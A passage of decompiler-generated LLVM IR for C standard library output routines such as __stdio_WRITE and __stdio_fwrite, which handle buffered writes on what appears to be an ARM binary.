dec_label_pc_13e10:                               ; preds = %dec_label_pc_13df8, %dec_label_pc_13e30.dec_label_pc_13e10_crit_edge
  %v2_13e20 = phi i32 [ %v2_13e30, %dec_label_pc_13e30.dec_label_pc_13e10_crit_edge ], [ %v2_13e2014, %dec_label_pc_13df8 ]
  %v0_13e18 = phi i32 [ %v0_13e10.pre, %dec_label_pc_13e30.dec_label_pc_13e10_crit_edge ], [ %v2_13e04, %dec_label_pc_13df8 ]
  %v1_13e10 = inttoptr i32 %v0_13e18 to i32*
  %v2_13e10 = load i32, i32* %v1_13e10, align 4
  %v1_13e18 = add i32 %v0_13e18, 4
  store i32 %v1_13e18, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_13e10, 127
  br i1 %tmp36, label %dec_label_pc_13dd4, label %dec_label_pc_13e20

dec_label_pc_13e20:                               ; preds = %dec_label_pc_13e10
  %v1_13e20 = trunc i32 %v2_13e10 to i8
  %v3_13e20 = inttoptr i32 %v2_13e20 to i8*
  store i8 %v1_13e20, i8* %v3_13e20, align 1
  %v0_13e24 = load i32, i32* @ip, align 4
  %v1_13e24 = inttoptr i32 %v0_13e24 to i8*
  %v2_13e24 = load i8, i8* %v1_13e24, align 1
  %v2_13e28 = icmp eq i8 %v2_13e24, 0
  br i1 %v2_13e28, label %dec_label_pc_13de8, label %dec_label_pc_13e30

dec_label_pc_13e30:                               ; preds = %dec_label_pc_13e20
  %v1_13e30 = load i32, i32* %r2.global-to-local, align 4
  %v2_13e30 = add i32 %v1_13e30, %v0_13e24
  store i32 %v2_13e30, i32* @ip, align 4
  %v0_13e34 = load i32, i32* %r0.global-to-local, align 4
  %v1_13e34 = add i32 %v0_13e34, -1
  store i32 %v1_13e34, i32* %r0.global-to-local, align 4
  %v2_13e38 = icmp eq i32 %v1_13e34, 0
  br i1 %v2_13e38, label %dec_label_pc_13e40, label %dec_label_pc_13e30.dec_label_pc_13e10_crit_edge

dec_label_pc_13e30.dec_label_pc_13e10_crit_edge:  ; preds = %dec_label_pc_13e30
  %v0_13e10.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_13e10

dec_label_pc_13e40:                               ; preds = %dec_label_pc_13e30, %dec_label_pc_13df8, %dec_label_pc_13de8
  %v0_13e40 = phi i32 [ %v0_13e24, %dec_label_pc_13de8 ], [ %v2_13e2014, %dec_label_pc_13df8 ], [ %v2_13e30, %dec_label_pc_13e30 ]
  %v1_13e40 = load i32, i32* @sp, align 4
  %v9_13e40 = icmp eq i32 %v0_13e40, %v1_13e40
  br i1 %v9_13e40, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_13e40
  %v1_13e44 = load i32, i32* @lr, align 4
  store i32 %v1_13e44, i32* %v1_13e04, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_13e40, %bb30
  %v0_13e48 = load i32, i32* %r0.global-to-local, align 4
  %v1_13e48 = load i32, i32* %r4.global-to-local, align 4
  %v2_13e48 = sub i32 %v1_13e48, %v0_13e48
  store i32 %v2_13e48, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13e4c

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13dd4, %bb31
  %v0_13e4c = phi i32 [ %v0_13e4c.pre, %dec_label_pc_13dd4 ], [ %v2_13e48, %bb31 ]
  store i32 %v0_13e4c, i32* %r0.global-to-local, align 4
  %v2_13e54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e54, i32* %r4.global-to-local, align 4
  ret i32 %v0_13e4c

; uselistorder directives
  uselistorder i32 %v0_13e4c, { 1, 0 }
  uselistorder i32 %v1_13e34, { 1, 0 }
  uselistorder i32 %v2_13e30, { 0, 2, 1 }
  uselistorder i32 %v2_13e10, { 1, 0 }
  uselistorder i32 %v2_13e2014, { 1, 0 }
  uselistorder i32 %v1_13dfc.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 6, 3, 0 }
  uselistorder i32* @sp, { 15, 17, 0, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 3, 4, 5, 6, 16 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e4c, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_13e10, { 1, 0 }
  uselistorder label %dec_label_pc_13df8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13dbc, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_13e6c2 = icmp eq i32 %arg3, 0
  store i1 %v2_13e6c2, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_13e6c2, label %dec_label_pc_13f0c, label %dec_label_pc_13e78

dec_label_pc_13e6cthread-pre-split:               ; preds = %bb22
  %v3_13e90 = load i32, i32* %r7.global-to-local, align 4
  %v5_13e90 = add i32 %v3_13e90, %v4_13e84
  store i32 %v5_13e90, i32* %r7.global-to-local, align 4
  %v5_13e94 = sub i32 %v0_13e8c, %v4_13e84
  store i32 %v5_13e94, i32* %r5.global-to-local, align 4
  %v2_13e6c = icmp eq i32 %v5_13e94, 0
  store i1 %v2_13e6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_13e94, i32* @r2, align 4
  br i1 %v2_13e6c, label %dec_label_pc_13e6c.dec_label_pc_13f0c.loopexit_crit_edge, label %dec_label_pc_13e78

dec_label_pc_13e78:                               ; preds = %entry, %dec_label_pc_13e6cthread-pre-split
  %v0_13e7c = phi i32 [ %v5_13e90, %dec_label_pc_13e6cthread-pre-split ], [ %arg2, %entry ]
  %v0_13e78.in = phi i32 [ %v5_13e94, %dec_label_pc_13e6cthread-pre-split ], [ %arg3, %entry ]
  %v0_13e78 = icmp slt i32 %v0_13e78.in, 0
  br i1 %v0_13e78, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_13e78
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_13e78, %bb
  %v0_13e80 = load i32, i32* @r4, align 4
  %v1_13e80 = add i32 %v0_13e80, 4
  %v2_13e80 = inttoptr i32 %v1_13e80 to i32*
  %v3_13e80 = load i32, i32* %v2_13e80, align 4
  store i32 %v3_13e80, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_13e7c to i32*
  %v4_13e84 = call i32 @__libc_write(i32 %v3_13e80, i32* %tmp23)
  store i32 %v4_13e84, i32* %r0.global-to-local, align 4
  %v1_13e88 = icmp slt i32 %v4_13e84, 0
  %v2_13e88 = icmp eq i32 %v4_13e84, 0
  store i1 %v2_13e88, i1* %cpsr_z.global-to-local, align 1
  %v0_13e8c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13e8c, i32* %r6.global-to-local, align 4
  br i1 %v1_13e88, label %dec_label_pc_13e9c, label %dec_label_pc_13e6cthread-pre-split

dec_label_pc_13e9c:                               ; preds = %bb22
  %v0_13e9c = load i32, i32* @r4, align 4
  %v1_13e9c = inttoptr i32 %v0_13e9c to i32*
  %v2_13e9c = load i32, i32* %v1_13e9c, align 4
  store i32 %v2_13e9c, i32* %r3.global-to-local, align 4
  %v1_13ea0 = add i32 %v0_13e9c, 8
  store i32 %v1_13ea0, i32* %r0.global-to-local, align 4
  %v1_13ea4 = inttoptr i32 %v1_13ea0 to i32*
  %v2_13ea4 = load i32, i32* %v1_13ea4, align 4
  store i32 %v2_13ea4, i32* %r0.global-to-local, align 4
  %v3_13ea4 = add i32 %v0_13e9c, 12
  %v4_13ea4 = inttoptr i32 %v3_13ea4 to i32*
  %v5_13ea4 = load i32, i32* %v4_13ea4, align 4
  %v1_13ea8 = or i32 %v2_13e9c, 8
  store i32 %v1_13ea8, i32* %r3.global-to-local, align 4
  %v3_13eac = sdiv i32 %v2_13e9c, 256
  %v2_13eb0 = sub i32 %v5_13ea4, %v2_13ea4
  store i32 %v2_13eb0, i32* %r2.global-to-local, align 4
  %v9_13eb0 = icmp eq i32 %v5_13ea4, %v2_13ea4
  store i1 %v9_13eb0, i1* %cpsr_z.global-to-local, align 1
  %v1_13eb4 = trunc i32 %v3_13eac to i8
  %v3_13eb4 = add i32 %v0_13e9c, 1
  %v4_13eb4 = inttoptr i32 %v3_13eb4 to i8*
  store i8 %v1_13eb4, i8* %v4_13eb4, align 1
  %v0_13eb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_13eb8 = trunc i32 %v0_13eb8 to i8
  %v2_13eb8 = load i32, i32* @r4, align 4
  %v3_13eb8 = inttoptr i32 %v2_13eb8 to i8*
  store i8 %v1_13eb8, i8* %v3_13eb8, align 1
  %v0_13ebc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13ebc, label %dec_label_pc_13e9c.dec_label_pc_13f08_crit_edge, label %dec_label_pc_13ec0

dec_label_pc_13e9c.dec_label_pc_13f08_crit_edge:  ; preds = %dec_label_pc_13e9c
  %v0_13f08.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f08

dec_label_pc_13ec0:                               ; preds = %dec_label_pc_13e9c
  %v0_13ec0 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ec0 = load i32, i32* %r5.global-to-local, align 4
  %v9_13ec0 = icmp eq i32 %v0_13ec0, %v1_13ec0
  store i1 %v9_13ec0, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_13ec0, %v1_13ec0
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_13ec0
  store i32 %v0_13ec0, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_13ec0, %bb24
  %v0_13ec8.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_13ecc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_13eec
  %v2_13ecc = phi i32 [ %v2_13ecc.pre, %.preheader ], [ %v1_13ef0, %dec_label_pc_13eec ]
  %v0_13ec8 = phi i32 [ %v0_13ec8.pre, %.preheader ], [ %v1_13ed8, %dec_label_pc_13eec ]
  %v1_13ec8 = inttoptr i32 %v0_13ec8 to i8*
  %v2_13ec8 = load i8, i8* %v1_13ec8, align 1
  %v3_13ec8 = zext i8 %v2_13ec8 to i32
  store i32 %v3_13ec8, i32* %r3.global-to-local, align 4
  %v3_13ecc = inttoptr i32 %v2_13ecc to i8*
  store i8 %v2_13ec8, i8* %v3_13ecc, align 1
  %v0_13ed0 = load i32, i32* %r0.global-to-local, align 4
  %v1_13ed0 = inttoptr i32 %v0_13ed0 to i8*
  %v2_13ed0 = load i8, i8* %v1_13ed0, align 1
  %v3_13ed0 = zext i8 %v2_13ed0 to i32
  store i32 %v3_13ed0, i32* %r3.global-to-local, align 4
  %v7_13ed4 = icmp eq i8 %v2_13ed0, 10
  store i1 %v7_13ed4, i1* %cpsr_z.global-to-local, align 1
  %v0_13ed8 = load i32, i32* %r7.global-to-local, align 4
  %v1_13ed8 = add i32 %v0_13ed8, 1
  store i32 %v1_13ed8, i32* %r7.global-to-local, align 4
  br i1 %v7_13ed4, label %dec_label_pc_13ee0, label %dec_label_pc_13eec

dec_label_pc_13ee0:                               ; preds = %bb25
  %v0_13ee0 = load i32, i32* @r4, align 4
  %v1_13ee0 = add i32 %v0_13ee0, 1
  %v2_13ee0 = inttoptr i32 %v1_13ee0 to i8*
  %v3_13ee0 = load i8, i8* %v2_13ee0, align 1
  %v4_13ee0 = zext i8 %v3_13ee0 to i32
  store i32 %v4_13ee0, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_13ee0, 2
  %v2_13ee4 = icmp eq i8 %tmp30, 0
  store i1 %v2_13ee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ee4, label %dec_label_pc_13eec, label %dec_label_pc_13ef8

dec_label_pc_13eec:                               ; preds = %dec_label_pc_13ee0, %bb25
  %v0_13eec = load i32, i32* %r6.global-to-local, align 4
  %v1_13eec = add i32 %v0_13eec, -1
  store i32 %v1_13eec, i32* %r6.global-to-local, align 4
  %v7_13eec = icmp eq i32 %v0_13eec, 1
  store i1 %v7_13eec, i1* %cpsr_z.global-to-local, align 1
  %v1_13ef0 = add i32 %v0_13ed0, 1
  store i32 %v1_13ef0, i32* %r0.global-to-local, align 4
  br i1 %v7_13eec, label %dec_label_pc_13eec.dec_label_pc_13ef8_crit_edge, label %bb25

dec_label_pc_13eec.dec_label_pc_13ef8_crit_edge:  ; preds = %dec_label_pc_13eec
  %v0_13ef8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13ef8

dec_label_pc_13ef8:                               ; preds = %dec_label_pc_13ee0, %dec_label_pc_13eec.dec_label_pc_13ef8_crit_edge
  %v0_13efc = phi i32 [ %v1_13ef0, %dec_label_pc_13eec.dec_label_pc_13ef8_crit_edge ], [ %v0_13ed0, %dec_label_pc_13ee0 ]
  %v0_13ef8 = phi i32 [ %v0_13ef8.pre, %dec_label_pc_13eec.dec_label_pc_13ef8_crit_edge ], [ %v0_13ee0, %dec_label_pc_13ee0 ]
  %v1_13ef8 = add i32 %v0_13ef8, 8
  %v2_13ef8 = inttoptr i32 %v1_13ef8 to i32*
  %v3_13ef8 = load i32, i32* %v2_13ef8, align 4
  store i32 %v3_13ef8, i32* %r3.global-to-local, align 4
  %v2_13efc = add i32 %v0_13ef8, 16
  %v3_13efc = inttoptr i32 %v2_13efc to i32*
  store i32 %v0_13efc, i32* %v3_13efc, align 4
  %v0_13f00 = load i32, i32* %r3.global-to-local, align 4
  %v1_13f00 = load i32, i32* %r0.global-to-local, align 4
  %v2_13f00 = sub i32 %v1_13f00, %v0_13f00
  store i32 %v2_13f00, i32* %r3.global-to-local, align 4
  %v1_13f04 = load i32, i32* %r5.global-to-local, align 4
  %v2_13f04 = sub i32 %v1_13f04, %v2_13f00
  store i32 %v2_13f04, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f08

dec_label_pc_13f08:                               ; preds = %dec_label_pc_13e9c.dec_label_pc_13f08_crit_edge, %dec_label_pc_13ef8
  %v0_13f08 = phi i32 [ %v0_13f08.pre, %dec_label_pc_13e9c.dec_label_pc_13f08_crit_edge ], [ %v2_13f04, %dec_label_pc_13ef8 ]
  %v1_13f08 = load i32, i32* %r8.global-to-local, align 4
  %v2_13f08 = sub i32 %v1_13f08, %v0_13f08
  store i32 %v2_13f08, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13f0c

dec_label_pc_13e6c.dec_label_pc_13f0c.loopexit_crit_edge: ; preds = %dec_label_pc_13e6cthread-pre-split
  %v0_13f0c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13f0c

dec_label_pc_13f0c:                               ; preds = %entry, %dec_label_pc_13e6c.dec_label_pc_13f0c.loopexit_crit_edge, %dec_label_pc_13f08
  %v0_13f0c = phi i32 [ %v2_13f08, %dec_label_pc_13f08 ], [ %v0_13f0c.pre.pre, %dec_label_pc_13e6c.dec_label_pc_13f0c.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_13f0c, i32* %r0.global-to-local, align 4
  ret i32 %v0_13f0c

; uselistorder directives
  uselistorder i32 %v0_13f0c, { 1, 0 }
  uselistorder i32 %v0_13ef8, { 1, 0 }
  uselistorder i32 %v1_13ef0, { 0, 2, 1 }
  uselistorder i32 %v0_13eec, { 1, 0 }
  uselistorder i1 %v2_13ee4, { 1, 0 }
  uselistorder i32 %v1_13ed8, { 1, 0 }
  uselistorder i32 %v0_13ec0, { 1, 0, 2 }
  uselistorder i32 %v5_13ea4, { 1, 0 }
  uselistorder i32 %v2_13ea4, { 1, 0, 2 }
  uselistorder i32 %v0_13e8c, { 1, 0 }
  uselistorder i32 %v4_13e84, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_13e94, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 4, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 9, 8, 0 }
  uselistorder i32 (i32, i32*)* @__libc_write, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f0c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13f08, { 1, 0 }
  uselistorder label %dec_label_pc_13ef8, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_13e78, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13f14 = load i32, i32* @r4, align 4
  store i32 %v3_13f14, i32* %stack_var_-20, align 4
  %v6_13f14 = load i32, i32* @r5, align 4
  %v9_13f14 = load i32, i32* @r6, align 4
  %v12_13f14 = load i32, i32* @r7, align 4
  %v15_13f14 = load i32, i32* @lr, align 4
  %v1_13f18 = add i32 %arg3, 1
  %v2_13f18 = inttoptr i32 %v1_13f18 to i8*
  %v3_13f18 = load i8, i8* %v2_13f18, align 1
  %v4_13f18 = zext i8 %v3_13f18 to i32
  %v3_13f1c = mul nuw nsw i32 %v4_13f18, 256
  %v1_13f20 = and i32 %v3_13f1c, 512
  store i32 %v1_13f20, i32* @r4, align 4
  %v2_13f20 = icmp eq i32 %v1_13f20, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13f20, label %dec_label_pc_13f34, label %dec_label_pc_14030

dec_label_pc_13f34:                               ; preds = %entry
  %v1_13f34 = add i32 %arg3, 4
  %v2_13f34 = inttoptr i32 %v1_13f34 to i32*
  %v3_13f34 = load i32, i32* %v2_13f34, align 4
  %v1_13f3c = add i32 %arg3, 16
  %v2_13f3c = inttoptr i32 %v1_13f3c to i32*
  %v3_13f3c = load i32, i32* %v2_13f3c, align 4
  store i32 %v3_13f3c, i32* @r0, align 4
  %v1_13f40 = add i32 %arg3, 12
  %v2_13f40 = inttoptr i32 %v1_13f40 to i32*
  %v3_13f40 = load i32, i32* %v2_13f40, align 4
  %v4_13f44 = icmp eq i32 %v3_13f34, -2
  %v2_13f48 = sub i32 %v3_13f40, %v3_13f3c
  br i1 %v4_13f44, label %dec_label_pc_13f48, label %dec_label_pc_13f70

dec_label_pc_13f48:                               ; preds = %dec_label_pc_13f34
  %v3_13f4c = icmp ugt i32 %v2_13f48, %arg2
  br i1 %v3_13f4c, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_13f48
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_13f48, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_13f48, %dec_label_pc_13f48 ]
  %v0_13f54 = phi i32 [ %arg2, %bb ], [ %v2_13f48, %dec_label_pc_13f48 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_13f54, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_13f5c = call i32 @memcpy()
  %v0_13f60 = load i32, i32* @r5, align 4
  %v1_13f60 = add i32 %v0_13f60, 16
  %v2_13f60 = inttoptr i32 %v1_13f60 to i32*
  %v3_13f60 = load i32, i32* %v2_13f60, align 4
  %v1_13f64 = load i32, i32* @r4, align 4
  %v2_13f64 = add i32 %v1_13f64, %v3_13f60
  store i32 %v2_13f64, i32* %v2_13f60, align 4
  br label %dec_label_pc_14044

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13f34
  %tmp = icmp ult i32 %v2_13f48, %arg2
  br i1 %tmp, label %dec_label_pc_14010, label %dec_label_pc_13f7c

dec_label_pc_13f7c:                               ; preds = %dec_label_pc_13f70
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_13f84 = call i32 @memcpy()
  %v0_13f88 = load i32, i32* @r5, align 4
  %v1_13f88 = add i32 %v0_13f88, 16
  %v2_13f88 = inttoptr i32 %v1_13f88 to i32*
  %v3_13f88 = load i32, i32* %v2_13f88, align 4
  %v1_13f8c = add i32 %v0_13f88, 1
  %v2_13f8c = inttoptr i32 %v1_13f8c to i8*
  %v3_13f8c = load i8, i8* %v2_13f8c, align 1
  %v1_13f90 = load i32, i32* @r6, align 4
  %v2_13f90 = add i32 %v1_13f90, %v3_13f88
  %tmp17 = urem i8 %v3_13f8c, 2
  %v2_13f94 = icmp eq i8 %tmp17, 0
  store i32 %v2_13f90, i32* %v2_13f88, align 4
  br i1 %v2_13f94, label %dec_label_pc_14044, label %dec_label_pc_13fa0

dec_label_pc_13fa0:                               ; preds = %dec_label_pc_13f7c
  %v0_13fa0 = load i32, i32* %r7.global-to-local, align 4
  %v0_13fa8 = load i32, i32* @r6, align 4
  %v4_13fac = call i32 @memrchr(i32 %v0_13fa0, i32 10, i32 %v0_13fa8, i32 %v2_13f90)
  %v2_13fb0 = icmp eq i32 %v4_13fac, 0
  br i1 %v2_13fb0, label %dec_label_pc_14044, label %dec_label_pc_13fb8

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_13fa0
  %v0_13fb8 = load i32, i32* @r5, align 4
  store i32 %v0_13fb8, i32* @r0, align 4
  %v0_13fbc = call i32 @__stdio_wcommit()
  %v2_13fc0 = icmp eq i32 %v0_13fbc, 0
  br i1 %v2_13fc0, label %dec_label_pc_14044, label %dec_label_pc_13fc8

dec_label_pc_13fc8:                               ; preds = %dec_label_pc_13fb8
  %v0_13fc8 = load i32, i32* @r6, align 4
  %v3_13fc8 = icmp uge i32 %v0_13fc8, %v0_13fbc
  %v0_13fbc.v0_13fc8 = select i1 %v3_13fc8, i32 %v0_13fbc, i32 %v0_13fc8
  store i32 %v0_13fbc.v0_13fc8, i32* @r4, align 4
  %v2_13fd4 = sub i32 %v0_13fc8, %v0_13fbc.v0_13fc8
  %v0_13fd8 = load i32, i32* %r7.global-to-local, align 4
  %v2_13fd8 = add i32 %v0_13fd8, %v2_13fd4
  store i32 %v2_13fd8, i32* %r7.global-to-local, align 4
  store i32 %v0_13fbc.v0_13fc8, i32* @r2, align 4
  %v4_13fe8 = call i32 @__GI_memchr(i32 %v2_13fd8, i32 10, i32 %v0_13fbc.v0_13fc8, i32 %v2_13fd4)
  %v2_13fec = icmp eq i32 %v4_13fe8, 0
  br i1 %v2_13fec, label %dec_label_pc_14044, label %dec_label_pc_13ff4

dec_label_pc_13ff4:                               ; preds = %dec_label_pc_13fc8
  %v0_13ff4 = load i32, i32* @r5, align 4
  %v1_13ff4 = add i32 %v0_13ff4, 16
  %v2_13ff4 = inttoptr i32 %v1_13ff4 to i32*
  %v3_13ff4 = load i32, i32* %v2_13ff4, align 4
  %v0_13ff8 = load i32, i32* %r7.global-to-local, align 4
  %v1_13ff8 = load i32, i32* @r4, align 4
  %v2_13ff8 = sub i32 %v0_13ff8, %v4_13fe8
  %v2_13ffc = add i32 %v2_13ff8, %v1_13ff8
  %v2_14000 = sub i32 %v3_13ff4, %v2_13ffc
  %v1_14004 = load i32, i32* @r6, align 4
  %v2_14004 = sub i32 %v1_14004, %v2_13ffc
  store i32 %v2_14004, i32* @r6, align 4
  store i32 %v2_14000, i32* %v2_13ff4, align 4
  br label %dec_label_pc_14044

dec_label_pc_14010:                               ; preds = %dec_label_pc_13f70
  %v1_14010 = add i32 %arg3, 8
  %v2_14010 = inttoptr i32 %v1_14010 to i32*
  %v3_14010 = load i32, i32* %v2_14010, align 4
  %v9_14014 = icmp eq i32 %v3_13f3c, %v3_14010
  br i1 %v9_14014, label %dec_label_pc_14030, label %dec_label_pc_1401c

dec_label_pc_1401c:                               ; preds = %dec_label_pc_14010
  store i32 %arg3, i32* @r0, align 4
  %v0_14020 = call i32 @__stdio_wcommit()
  %v2_14024 = icmp eq i32 %v0_14020, 0
  br i1 %v2_14024, label %dec_label_pc_1401c.dec_label_pc_14030_crit_edge, label %bb13

dec_label_pc_1401c.dec_label_pc_14030_crit_edge:  ; preds = %dec_label_pc_1401c
  %v0_14038.pre = load i32, i32* @r6, align 4
  %v0_14030.pre = load i32, i32* @r5, align 4
  %v0_14034.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_1403c.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_14030

bb13:                                             ; preds = %dec_label_pc_1401c
  %v1_14028 = load i32, i32* @r4, align 4
  store i32 %v1_14028, i32* @r6, align 4
  br label %dec_label_pc_14044

dec_label_pc_14030:                               ; preds = %dec_label_pc_1401c.dec_label_pc_14030_crit_edge, %entry, %dec_label_pc_14010
  %v2_1403c = phi i32 [ %v2_1403c.pre, %dec_label_pc_1401c.dec_label_pc_14030_crit_edge ], [ %v3_13f14, %entry ], [ %v3_13f14, %dec_label_pc_14010 ]
  %v0_14034 = phi i32 [ %v0_14034.pre, %dec_label_pc_1401c.dec_label_pc_14030_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_14010 ]
  %v0_14030 = phi i32 [ %v0_14030.pre, %dec_label_pc_1401c.dec_label_pc_14030_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_14010 ]
  %v0_14038 = phi i32 [ %v0_14038.pre, %dec_label_pc_1401c.dec_label_pc_14030_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_14010 ]
  store i32 %v2_1403c, i32* @r4, align 4
  store i32 %v9_13f14, i32* @r6, align 4
  store i32 %v15_13f14, i32* @lr, align 4
  %v3_14040 = inttoptr i32 %v0_14030 to i8*
  %v4_14040 = call i32 @__stdio_WRITE(i8* %v3_14040, i32 %v0_14034, i32 %v0_14038)
  br label %dec_label_pc_14044

dec_label_pc_14044:                               ; preds = %bb13, %dec_label_pc_13fc8, %dec_label_pc_13fb8, %dec_label_pc_13fa0, %dec_label_pc_13f7c, %dec_label_pc_13ff4, %bb10, %dec_label_pc_14030
  %v0_14044 = load i32, i32* @r6, align 4
  %v2_14048 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14048, i32* @r4, align 4
  store i32 %v6_13f14, i32* @r5, align 4
  store i32 %v9_13f14, i32* @r6, align 4
  store i32 %v12_13f14, i32* @r7, align 4
  ret i32 %v0_14044

; uselistorder directives
  uselistorder i32 %v2_13ffc, { 1, 0 }
  uselistorder i32 %v2_13fd4, { 1, 0 }
  uselistorder i32 %v0_13fbc.v0_13fc8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13fc8, { 1, 0, 2 }
  uselistorder i32 %v2_13f48, { 2, 0, 1, 3 }
  uselistorder i32 %v9_13f14, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %arg3, { 0, 1, 2, 6, 4, 3, 7, 8, 5 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_14044, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_14030, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1404c = load i32, i32* @r4, align 4
  store i32 %v3_1404c, i32* %stack_var_-8, align 4
  %v3_14050 = load i8, i8* %arg1, align 1
  %v4_14050 = zext i8 %v3_14050 to i32
  store i32 %v4_14050, i32* %r2.global-to-local, align 4
  %v2_14054 = add i32 %tmp, 1
  %v3_14054 = inttoptr i32 %v2_14054 to i8*
  %v4_14054 = load i8, i8* %v3_14054, align 1
  %v5_14054 = zext i8 %v4_14054 to i32
  store i32 %v5_14054, i32* %r3.global-to-local, align 4
  %v4_14058 = mul nuw nsw i32 %v5_14054, 256
  %v5_14058 = or i32 %v4_14058, %v4_14050
  store i32 %v5_14058, i32* %r2.global-to-local, align 4
  %v2_1405c = and i32 %v5_14058, %arg2
  %v4_1405c = icmp eq i32 %v2_1405c, 0
